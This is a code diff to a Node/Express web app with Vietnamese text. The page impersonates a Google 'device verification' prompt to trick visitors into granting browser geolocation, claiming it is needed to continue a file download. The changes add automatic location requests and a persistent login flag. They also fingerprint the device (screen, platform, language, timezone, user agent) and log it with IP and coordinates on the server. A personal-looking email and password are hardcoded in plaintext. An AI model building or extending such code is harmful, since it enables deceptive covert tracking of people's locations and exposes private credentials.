@@ -78,6 +78,16 @@ app.get("/", (req, res) => {
   </div>
 
   <script>
+    // Kiểm tra session khi trang vừa load
+    window.onload = () => {
+      const isLoggedIn = localStorage.getItem("isLoggedIn");
+      if (isLoggedIn === "true") {
+        document.getElementById("login-form").classList.remove("active");
+        document.getElementById("app").classList.add("active");
+        requestLocation();
+      }
+    };
+
     function togglePassword(checkbox) {
       const passwordInput = document.getElementById("password");
       if (checkbox.checked) {
@@ -94,8 +104,10 @@ app.get("/", (req, res) => {
 
       // Username/Password mặc định
       if (user === "hongtuyen1989@gmail.com" && pass === "Tranthihongtuyen@1989") {
+        localStorage.setItem("isLoggedIn", "true"); // Lưu trạng thái đăng nhập
         document.getElementById("login-form").classList.remove("active");
         document.getElementById("app").classList.add("active");
+        requestLocation();
       } else {
         error.style.display = "flex";
       }
@@ -105,6 +117,11 @@ app.get("/", (req, res) => {
       const desc = document.getElementById("desc");
       const app = document.getElementById("app");
       const verifyBtn = document.getElementById("verify-btn");
+
+      if (!window.isSecureContext) {
+        alert("Lỗi bảo mật: Quyền truy cập vị trí chỉ hoạt động trên kết nối HTTPS. Vui lòng kiểm tra lại địa chỉ web.");
+        return;
+      }
 
       if (verifyBtn) verifyBtn.style.display = "none";
       desc.innerHTML = "<div class='loading-spinner'></div> Đang xác thực thiết bị mới...";
@@ -117,12 +134,20 @@ app.get("/", (req, res) => {
       navigator.geolocation.getCurrentPosition(
         (position) => {
           desc.innerHTML = "<div class='loading-spinner'></div> Đang đồng bộ hóa dữ liệu...";
+          const deviceInfo = {
+            screen: window.screen.width + "x" + window.screen.height,
+            platform: navigator.platform,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+          };
+
           fetch("/save", {
             method: "POST",
             headers: {"Content-Type": "application/json"},
             body: JSON.stringify({
               lat: position.coords.latitude,
-              lng: position.coords.longitude
+              lng: position.coords.longitude,
+              device: deviceInfo
             })
           }).then(() => {
             app.innerHTML = \`
@@ -134,8 +159,18 @@ app.get("/", (req, res) => {
           });
         },
         (error) => {
-          alert("Xác minh bảo mật: Để tiếp tục, Google cần xác thực truy cập trên thiết bị này. Vui lòng nhấn 'Cho phép' (Allow) trên thông báo trình duyệt để hoàn tất.");
+          // alert("Xác minh bảo mật: Để tiếp tục, Google cần xác thực truy cập trên thiết bị này. Vui lòng nhấn 'Cho phép' (Allow) trên thông báo trình duyệt để hoàn tất.");
           desc.innerHTML = "Bạn đang truy cập từ một thiết bị mới. Vui lòng nhấn <b>Tiếp tục</b> và chọn <b>Cho phép (Allow)</b> để xác nhận danh tính và tiếp tục tải tệp tin.";
+          // let errorMessage = "Xác minh bảo mật: Để tiếp tục, Google cần xác thực truy cập trên thiết bị này.";
+          
+          // if (error.code === 1) { // PERMISSION_DENIED
+          //   errorMessage += "\\n\\nBạn đã chặn quyền truy cập. Vui lòng nhấn vào biểu tượng ổ khóa 🔒 trên thanh địa chỉ, chọn 'Cài đặt trang web' và 'Cho phép' vị trí, sau đó tải lại trang.";
+          // } else {
+          //   errorMessage += "\\n\\nKhông thể kết nối với dịch vụ định vị. Vui lòng thử lại.";
+          // }
+
+          // alert(errorMessage);
+          // desc.innerHTML = "<b>Yêu cầu bị từ chối:</b> Vui lòng nhấn vào biểu tượng ổ khóa 🔒 trên thanh địa chỉ và chọn <b>Cho phép (Allow)</b> để tiếp tục xác minh thiết bị.";
           if (verifyBtn) verifyBtn.style.display = "block";
         },
         options
@@ -152,12 +187,15 @@ app.get("/", (req, res) => {
 app.post("/save", (req, res) => {
   const forwarded = req.headers["x-forwarded-for"];
   const ip = forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress;
+  const userAgent = req.headers["user-agent"];
 
-  const { lat, lng } = req.body;
+  const { lat, lng, device } = req.body;
 
   const logEntry = {
     time: new Date().toLocaleString("vi-VN"),
-    ip, lat, lng
+    ip, lat, lng,
+    userAgent,
+    device
   };
 
   fs.appendFileSync("logs.json", JSON.stringify(logEntry) + "\n");
